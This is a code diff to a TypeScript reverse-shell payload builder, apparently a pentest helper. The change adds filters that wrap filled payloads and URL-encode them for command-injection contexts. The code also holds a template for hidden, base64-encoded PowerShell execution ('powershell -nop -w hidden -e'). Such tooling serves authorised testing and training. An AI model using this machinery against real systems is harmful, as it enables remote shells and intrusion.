@@ -1,5 +1,6 @@
 import { utf16leBase64 } from "./encode";
 import { wrapForContext, type PasteContext } from "./context";
+import { applyFilter, FILTER_CONTEXTS, filterFitsOs, urlEncodeFiltered, type FilterId } from "./filters";
 import { fillListener, LISTENERS } from "./listeners";
 import { POWERSHELL_TCP } from "./psScripts";
 import type { BuiltPayload, ListenerId, PayloadDef } from "./types";
@@ -23,6 +24,11 @@ export interface BuildOptions {
   os?: "linux" | "windows";
   /** Used when it is in def.listeners; otherwise def.listeners[0]. */
   listener?: ListenerId;
+  /**
+   * Wraps the filled payload (filters.ts) instead of the context's bash -c step, then URL-encodes it in a URL context.
+   * Ignored outside FILTER_CONTEXTS, for the other OS, and while anything is unresolved.
+   */
+  filter?: FilterId;
 }
 
 /** Fills the placeholders and wraps the result so it works as pasted in `ctx`. */
@@ -76,6 +82,10 @@ export function buildPayload(
   const noteValues: Record<string, string> = {};
   for (const name of ["LHOST", "LPORT", "TARGET_IP", "BIND_PORT"]) noteValues[name] = value(name) ?? "";
   const notes: string[] = (def.notes ?? []).map((n) => fillListener(n, noteValues));
+  const os = def.os === "any" ? (opts.os ?? "linux") : def.os;
+  const filter = opts.filter && opts.filter !== "off" && FILTER_CONTEXTS.includes(ctx) && filterFitsOs(opts.filter, os)
+    ? opts.filter : null;
+  let parts = def.parts;
   let text: string;
   if (unresolved.length > 0) {
     // Keep the placeholder visible; encoding or wrapping it would hide the gap.
@@ -83,11 +93,18 @@ export function buildPayload(
       ? `powershell -nop -w hidden -e <UTF-16LE base64 of the script, once ${unresolved.map((n) => `{${n}}`).join(" ")} is set>`
       : filled;
     notes.push(`Set ${unresolved.join(", ")} first: the payload is not wrapped for ${ctx} until it is.`);
+  } else if (filter && !(filter === "ps-b64" && def.encodePowerShell)) {
+    const f = applyFilter(filled, filter);
+    text = ctx === "injected-linux" ? f.text : urlEncodeFiltered(f.text);
+    parts = [...def.parts, ...f.parts];
+    notes.push(f.note);
+    if (ctx !== "injected-linux") notes.push("Then URL-encoded (spaces as +).");
   } else {
     const raw = def.encodePowerShell ? `powershell -nop -w hidden -e ${utf16leBase64(filled)}` : filled;
-    const wrapped = wrapForContext(raw, ctx, def.os === "any" ? (opts.os ?? "linux") : def.os);
+    const wrapped = wrapForContext(raw, ctx, os);
     text = wrapped.text;
     notes.push(...wrapped.notes);
+    if (filter) notes.push("Already base64 (-e).");
   }
   if (def.bakesIp) notes.push("LHOST and LPORT are baked into the served script: regenerate it if either changes.");
 
@@ -103,5 +120,5 @@ export function buildPayload(
     if (l.connect) listenerHeading = "Connect from Kali";
     if (l.note) notes.push(fillListener(l.note, lv));
   }
-  return { def, text, listener, listenerId, listenerHeading, trigger, parts: def.parts, notes, unresolved, prepare };
+  return { def, text, listener, listenerId, listenerHeading, trigger, parts, notes, unresolved, prepare };
 }
